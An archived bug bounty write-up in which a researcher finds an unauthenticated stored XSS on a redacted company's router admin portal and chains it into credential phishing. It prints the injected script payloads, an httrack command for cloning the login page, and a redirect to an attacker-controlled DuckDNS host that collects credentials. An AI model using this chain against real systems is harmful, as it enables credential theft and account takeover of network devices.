# How I Found a Critical XSS On a Public Bug Bounty Program

- **Source URL:** https://1-day.medium.com/how-i-found-a-critical-xss-on-a-public-bug-bounty-program-27d492117f61?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250913132723/https://1-day.medium.com/how-i-found-a-critical-xss-on-a-public-bug-bounty-program-27d492117f61
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10511 (id 10511)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# How I Found a Critical XSS On a Public Bug Bounty Program

## INTRODUCTION

*Hello everyone, I’m back with another write-up about a cool vulnerability I discovered during my Bug Bounty journey. This one was found on a public program on Bugcrowd, but I can’t disclose the domain name, so I’ll refer to it as REDACTED.com. This program is a high-paying bug bounty program where it’s usually very hard to find any vulnerabilities, but I was able to find an interesting one that I’ll share with you in this article. Let’s get into it…*


## RECONNAISSANCE

### Stage 1 — Finding the attack surface

The only reconnaissance I did to find this domain was just a simple google dork.

`site:*.REDACTED.com -www`
Using this simple dork, I was able to fetch numerous amounts of subdomains. But one of them stood out for me, It looked like an IP address, but the dots are replaced with — (dashes). `10-10-10-16.mobile.REDACTED.com`

When I visited the domain, It was a login portal to a router which was somehow internally used by the company.

I tried all the default credentials, but none of them worked. So I hopped on to my 2nd stage of Recon.

### Stage 2 — Client side source code analysis

I quickly ran the [Javascript Bookmarklet](https://gist.github.com/mhmdiaa/dc24c06ab18ebe90df8981cd7b25a548) to fetch all endpoints from the client side code and writes it onto the page. It fetched me plenty of endpoints in the current subdomain.

I tried out all of the endpoints it gave me, but many of them was just 401 forbidden page. One of the endpoint gave me 200 OK with an interesting page.

`/guest/preview.cgi` exposed an admin page where it allows us to modify contents of any page like Terms & Conditions, Login page, etc.

### Stage 3 — Discovering Interesting Functionalities

It has a toggle button called `Edit mode` , which when toggled on, will allow us to edit the elements of the selected page. We can modify the stuffs like texts, buttons, Images and more.

So to test if it works, I tried adding `This was modified by 1-day` to the “Agree” button of the Terms and Conditions page. I was not sure if it will be saved if I clicked “Save”. And for the moment of truth, I clicked and waited…

BOOM! It said that the changes were saved, and I refreshed the page . . .

So this tells us that, We were able to permanently modify any contents of the page, totally unauthenticated. This itself was a critical misconfiguration. *But I’m not the type of guy who reports useless shit . . .*

## EXPLOITATION

So with the weapon to modify anything on the page, My mind quickly shifted to my least favorite vulnerability ever, Cross Site Scripting.

### DEEP INTO THE VULNERABILITY

When saving an edited page, It sends a POST request to `/guest/portal_admin_upload.cgi` with the request body of content type `multipart/form-data` where the page elements to be edited was inside a field called `edit_page` , which was in a JSON format.

So I quickly captured the request and found out that the “I Agree” button has the key called `agree_button` which directly passes anything to the page we set in the value field. (For eg: `{“agree_button”: “This is an Agree Button”}`). So I updated the request in Burpsuite with a very basic XSS payload like:

`{"agree_button": "<script>alert('PoC by 1-day')</script>"}`
and I send the request. I got the response as 200 OK with “Save success” message.

When I refreshed the page, I got:

The XSS payload was successfully executed.

So now we have an unauthenticated Stored XSS vulnerability.

But wait . . . *I’m not the type of guy who reports useless shit!*

### Chaining into potential Account Takeover

### Plan A

When we get a stored Cross Site Scripting and you need to escalate it to an Account takeover, our first instinct is to grab the user’s cookie and send back to our attacker controlled server. Yeah?

But in this case, It was not possible because the application had a very strict cookie where it had HttpOnly flag and also the `Path` was very specific to the main page, So there is no way we can grab the admin cookie.

So our plan A is a failure.

But wait, I thought about it for a few minutes and I got something in my mind . . .

### Plan B (Crafting the perfect exploit)

You’re about to witness a very clever exploitation chain which can be used to potentially get admin credentials using a stored XSS, here’s how.

Since we have a stored XSS completely unauthenticated, We can store an XSS payload which will redirect the visitor to our attacker server. But we should make it completely undetected, and with a purpose.

So I quickly hopped on to my terminal, and I used a program called **HTTrack** which can be used to clone an entire webpage to our local system. It will grab every JS, HTML, CSS, CGI files possible and store it in perfect hierarchal order.

So I cloned the login page of the router using HTTrack using the following command:

`httrack https://10-10-10-16.mobile.REDACTED.com/`
It took 10 minutes to perfectly clone the login page of the website.

Then for the main part, I’ve updated the `index.html` inside the `cgi-bin` directory (which handles the frontend auth functionality) to send the credentials back to my server.

### Setting up the clone

### Step 1

I logged into my AWS instance, grabbed its IP address and the Port to open the listener service. Created a simple Python server using Flask to listen for credentials and print it in a nice way:

And I modified the `cgi-bin/index.html` to send the credentials to my server instead of the original one.

Also for more stealth, I’ve made it redirect to the desired page (Preview page), **but you might be thinking like “The preview page is the one being exploited by XSS, so how can we redirect the victim to the page with normal state.”**

Here comes the secret . . .

After doing a simple parameter discovery, I found out that a parameter called `portal_id` can be controlled to edit different pages with the same functionality. Like, `preview.cgi?portal_id=1` is an edit page but separate from the main page `preview.cgi` . Similarly, `preview.cgi?portal_id=2` is separate from the portal\_id=1.

This means that we can redirect back the victim to `preview.cgi?portal_id=2` which isn’t infected by the XSS payload.

So the final edit of `cgi-bin/index.html` looked like this:

Here we send the credentials to our server on port 5000 (https://ourserver.com:5000/data) and after 3 seconds, we redirect the victim to the actual preview page of `portal_id=2` .

- Victim visits [https://10-10-10-16.mobile.REDACTED.com](https://10-10-10-16.mobile.REDACTED.com)/guest/preview.cgi
- Redirects to our server for login
- Redirects back to [https://10-10-10-16.mobile.REDACTED.com](https://10-10-10-16.mobile.REDACTED.com)/guest/preview.cgi?portal\_id=2 which isn’t infected by our XSS payload.

I quickly hosted the modified cloned page in my AWS server on port 4444 and used [DuckDNS](http://duckdns.org) to point a domain to my AWS instance IP address.

Then I send the XSS payload to `/guest/portal_admin_upload.cgi` with the payload as:

`<script>window.location.href=\“http://myserver.duckdns.org:4444\”</script>`
This will redirect the users to our cloned login page without even noticing.

### Full Chain

1. Victim visits *https://10–10–10–16.mobile.redacted.com/guest/preview.cgi*
2. Victim gets silently redirected to our attacker server with the perfectly cloned login page. (Even URL looks same because of perfect directory structure)
3. Victim unknowingly enters the credentials and log in.
4. The page says “Logged in successfully” and redirects the victim into the actual preview page after 3 seconds. (`preview.cgi?portal_id=2`)
5. The credentials will be successfully logged on our attacker server.

We have successfully demonstrated a practical impact on an unauthenticated stored XSS.

## IMPACT

Using this chained exploitation, an attacker can set up a very convincing login page inside the router application which can be unknowingly accessed by the admin and can lead to Account Takeover.

If an attacker gets access to the internal router’s admin panel, The attacker can easily modify the DNS/proxy to a malicious server which can be used to steal sensitive information from all the devices on the network, and can be used to escalate this to an exceptionally critical outcome.

## CONCLUSION

*I could’ve just reported the XSS right away like most hunters do… but I’m not one of them. Companies don’t need a popup saying “Hacked” on their screen, they need security issues that could actually cost them. At the end of the day, it’s the presentation of the attack that really matters.*


This was a detailed writeup on the way I found this interesting vulnerability. I hope everyone enjoyed this article.

If you truly loved it, Please support me by clapping and dropping your valuable comment.

If you need a PoC video for this vulnerability, feel free to contact me on [LinkedIn](https://www.linkedin.com/in/atulrv/).

Thank you :)
